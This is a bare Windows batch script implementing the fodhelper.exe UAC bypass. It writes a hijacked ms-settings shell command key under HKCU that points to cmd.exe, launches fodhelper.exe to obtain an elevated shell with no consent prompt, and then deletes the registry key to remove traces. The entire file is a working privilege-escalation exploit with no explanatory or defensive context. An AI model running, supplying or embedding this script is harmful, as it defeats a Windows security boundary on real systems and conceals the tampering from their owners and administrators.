@echo off
:: Check if already admin
fsutil dirty query %systemdrive% >nul 2>&1
if %errorlevel% EQU 0 goto :already_admin

:: Create registry hijack
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f  
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f

:: Trigger bypass
start fodhelper.exe

:: Cleanup
timeout /t 3 /nobreak >nul
reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f >nul 2>&1
exit

:already_admin
echo Already running as admin!
pause
